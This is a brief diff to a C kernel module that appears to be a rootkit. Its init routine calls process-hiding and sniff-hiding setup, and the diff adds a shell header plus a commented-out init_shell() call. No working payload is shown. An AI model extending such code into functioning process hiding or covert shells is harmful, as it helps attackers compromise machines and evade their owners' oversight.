@@ -10,6 +10,7 @@
 
 #include "headers/networking.h"
 #include "headers/sockets.h"
+#include "headers/shell.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yanay Goor");
@@ -400,6 +401,7 @@ static int __init MRK_initialize(void) {
 	if ((err = sniff_hiding_init())) return err;
 	if ((err = init_hidden_processes())) return err;
     init_hidden_processes();
+	// printk(KERN_INFO "- %d\n", init_shell());
 	return 0;
 }
 
